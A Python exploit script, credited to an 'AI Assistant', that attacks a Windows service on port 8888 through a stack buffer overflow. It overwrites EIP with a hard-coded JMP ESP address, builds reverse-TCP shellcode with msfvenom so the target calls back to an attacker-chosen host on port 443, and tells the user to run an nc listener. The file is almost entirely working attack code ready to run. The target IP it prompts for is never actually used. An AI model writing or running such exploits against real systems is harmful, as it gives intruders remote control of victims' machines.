#!/usr/bin/env python3
"""
Buffer Overflow Exploit - Windows Reverse Shell
Author: AI Assistant
Date: 2026-08-25
Description:
    Buffer Overflow exploit for Windows target.
    - Custom shellcode generation with msfvenom
    - EIP overwrite with JMP ESP
    - Reverse TCP shell
Target: Windows | Port 8888
"""

import socket
import struct
import subprocess
import sys
import time
from signal import SIGINT, SIGTERM
from signal import signal as signal_func

from pwn import *

# ───────────────────────────────────────────────────────────────
# Colors (fallback if termcolor not installed)
# ───────────────────────────────────────────────────────────────
try:
    from termcolor import colored
except ImportError:

    def colored(text, color=None, attrs=None):
        return text


# ───────────────────────────────────────────────────────────────
# Configuration
# ───────────────────────────────────────────────────────────────
context.log_level = "info"
context.arch = "i386"
context.os = "windows"

# Exploit Configuration
IP_ADDRESS = "127.0.0.1"
PORT = 8888
OFFSET = 1052
JMP_ESP = 0x68A98A7B  # 0x68a98a7b - JMP ESP address


# ───────────────────────────────────────────────────────────────
# Signal Handler
# ───────────────────────────────────────────────────────────────
def signal_handler(signum, frame):
    sig_name = "SIGINT" if signum == SIGINT else "SIGTERM"
    print(colored(f"\n[!] Caught {sig_name}. Shutting down gracefully...", "yellow"))
    sys.exit(0)


signal_func(SIGINT, signal_handler)
signal_func(SIGTERM, signal_handler)


# ───────────────────────────────────────────────────────────────
# Banner
# ───────────────────────────────────────────────────────────────
def banner():
    art = r"""
  ╔═══════════════════════════════════════════════════════════╗
  ║  ██████╗ ██████╗  ██████╗ ███████╗██████╗             ║
  ║  ██╔══██╗██╔══██╗██╔═══██╗██╔════╝██╔══██╗            ║
  ║  ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝            ║
  ║  ██╔══██╗██╔══██╗██║   ██║██╔══╝  ██╔══██╗            ║
  ║  ██████╔╝██║  ██║╚██████╔╝███████╗██║  ██║            ║
  ║  ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝            ║
  ║                                                           ║
  ║  Buffer Overflow Exploit - Windows Reverse Shell         ║
  ║  [ JMP ESP -> Shellcode -> Reverse TCP ]                ║
  ╚═══════════════════════════════════════════════════════════╝
    """
    print(colored(art, "yellow", attrs=["bold"]))


# ───────────────────────────────────────────────────────────────
# Shellcode Generation
# ───────────────────────────────────────────────────────────────
def generate_shellcode(lhost="10.10.17.119", lport=443):
    """Generate reverse shell shellcode using msfvenom."""
    p = log.progress("Generating Shellcode")
    p.status(f"Creating reverse shell for {lhost}:{lport}")

    # msfvenom command
    cmd = [
        "msfvenom",
        "-p",
        f"windows/shell_reverse_tcp LHOST={lhost} LPORT={lport}",
        "--platform",
        "windows",
        "-a",
        "x86",
        "-b",
        "\x00",
        "-f",
        "python",
        "EXITFUNC=thread",
    ]

    try:
        output = subprocess.check_output(cmd, stderr=subprocess.DEVNULL).decode()

        # Extract shellcode from Python output
        start = output.find("buf = ")
        if start != -1:
            start = output.find('"', start) + 1
            end = output.rfind('"')
            if start != -1 and end != -1:
                shellcode_str = output[start:end]
                # Remove quotes and convert to bytes
                shellcode_str = shellcode_str.replace('"', "")
                shellcode_str = shellcode_str.replace("\\x", "")
                shellcode = bytes.fromhex(shellcode_str)
                p.success(f"Generated {len(shellcode)} bytes of shellcode")
                return shellcode

        p.failure("Failed to parse msfvenom output")
        return None

    except subprocess.CalledProcessError as e:
        log.error(f"msfvenom failed: {e}")
        return None
    except Exception as e:
        log.error(f"Error generating shellcode: {e}")
        return None


# ───────────────────────────────────────────────────────────────
# Payload Builder
# ───────────────────────────────────────────────────────────────
def build_payload(shellcode, offset=OFFSET):
    """Build the exploit payload."""
    p = log.progress("Building Payload")

    # Build the payload
    payload = b"A" * offset  # Filler
    payload += p32(JMP_ESP)  # EIP -> JMP ESP
    payload += b"\x83\xec\x10"  # SUB ESP, 10
    payload += shellcode  # Shellcode

    p.success(f"Payload size: {len(payload)} bytes")

    return payload


# ───────────────────────────────────────────────────────────────
# Exploit Send Function
# ───────────────────────────────────────────────────────────────
def send_exploit(payload):
    """Send the exploit payload."""
    p = log.progress("Sending Exploit")
    p.status(f"Connecting to {IP_ADDRESS}:{PORT}")

    try:
        # Using pwn's remote connection
        conn = remote(IP_ADDRESS, PORT)
        p.status(f"Connected to {IP_ADDRESS}:{PORT}")

        # Send payload
        conn.send(payload)
        p.success("Payload sent!")

        # Wait for connection (optional)
        p.status("Waiting for reverse shell...")
        time.sleep(2)

        # Send test command to verify shell
        # conn.send(b'whoami\r\n')
        # data = conn.recv(1024)
        # log.info(f"Response: {data}")

        conn.close()
        p.success("Exploit completed!")
        return True

    except Exception as e:
        log.error(f"Exploit failed: {e}")
        return False


# ───────────────────────────────────────────────────────────────
# Listener Setup (Optional)
# ───────────────────────────────────────────────────────────────
def start_listener(lport=443):
    """Start a netcat listener."""
    p = log.progress("Starting Listener")
    p.status(f"Listening on port {lport}")

    try:
        # Use ncat or nc
        os.system(f"nc -lvnp {lport}")
    except:
        log.warning("nc not found, please start listener manually")
        print(colored(f"\n[!] Start listener: nc -lvnp {lport}", "yellow"))


# ───────────────────────────────────────────────────────────────
# Main Execution
# ───────────────────────────────────────────────────────────────
def main():
    banner()

    # Get arguments from user
    try:
        lhost = input(
            colored("[?] Enter LHOST (your IP, default: 10.10.17.119): ", "cyan")
        ).strip()
        if not lhost:
            lhost = "10.10.17.119"

        lport = input(colored("[?] Enter LPORT (default: 443): ", "cyan")).strip()
        if not lport:
            lport = 443
        else:
            lport = int(lport)

        ip_target = input(
            colored(f"[?] Enter target IP (default: {IP_ADDRESS}): ", "cyan")
        ).strip()
        if not ip_target:
            ip_target = IP_ADDRESS

    except KeyboardInterrupt:
        log.info("User interrupted")
        sys.exit(0)
    except Exception as e:
        log.error(f"Input error: {e}")
        sys.exit(1)

    # Generate shellcode
    shellcode = generate_shellcode(lhost, lport)
    if not shellcode:
        log.error("Failed to generate shellcode")
        sys.exit(1)

    # Build payload
    payload = build_payload(shellcode)

    # Show payload info
    log.info(f"Payload hexdump:")
    print(hexdump(payload[:64]))  # Show first 64 bytes
    log.info(f"Total payload size: {len(payload)} bytes")

    # Ask for confirmation
    response = input(colored("\n[?] Send exploit? (y/n): ", "yellow")).strip().lower()
    if response != "y":
        log.info("Exploit cancelled")
        sys.exit(0)

    # Send exploit
    log.info("Starting exploit...")
    log.warning("Make sure your listener is running!")
    print(colored(f"\n[!] Start listener: nc -lvnp {lport}", "yellow"))

    time.sleep(2)

    # Send the exploit
    send_exploit(payload)

    log.success("Exploit sent! Check your listener for reverse shell.")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[!] Interrupted by user", "yellow"))
        sys.exit(0)
    except Exception as e:
        log.error(f"Unexpected error: {e}")
        sys.exit(1)
